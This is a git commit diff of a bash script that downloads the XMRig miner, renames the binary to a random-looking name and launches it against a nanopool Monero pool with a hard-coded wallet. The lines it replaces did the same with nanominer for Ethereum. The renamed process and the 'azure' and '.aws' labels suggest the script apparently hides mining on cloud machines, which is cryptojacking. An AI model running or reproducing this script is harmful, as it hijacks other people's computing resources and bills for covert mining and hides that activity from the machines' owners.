acb9a926596dae23d0802415af3aee00409fed20
wollfoo <nhac.tien1988@gmail.com>
2023-10-15 17:12:43 +0700

    Update dphuoeht.sh

--- dphuoeht.sh
+++ dphuoeht.sh
@@ -1,22 +1,21 @@
 #!/bin/bash
-apt-get update
-apt-get install -y git wget screen
+sudo apt-get update
+VERSION=6.3.1
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 apt-get install -y git wget screen
-wget https://us.download.nvidia.com/tesla/460.73.01/NVIDIA-Linux-x86_64-460.73.01.run
-sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
-./NVIDIA-Linux-x86_64-460.73.01.run
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/hypernova
-wget https://github.com/wollfoo/wolethv100/releases/download/hypernova/hypernova.tar.gz
-mv hypernova.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf hypernova.tar.gz
-rm -rf hypernova.tar.gz && cd hypernova
-mv nanominer $azure -n
+rm -r /usr/share/work/xmrig-$VERSION
+wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
+mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
+rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
+mv xmrig $azure -n
 cp $azure "$cpuname"
-rm -f  nanominer
-echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" eth01.ini
-screen -d -m ./"${cpuname}" eth02.ini
+rm -f  xmrig
+POOL=xmr-us-west1.nanopool.org:14433
+USERNAME=4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXuU8as2uBFpRN2T.aws/fayzan.m_oob@gemselearning.com
+ALGO=rx/0
+DONATE=1
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.orc -p x -a $ALGO -k --tls
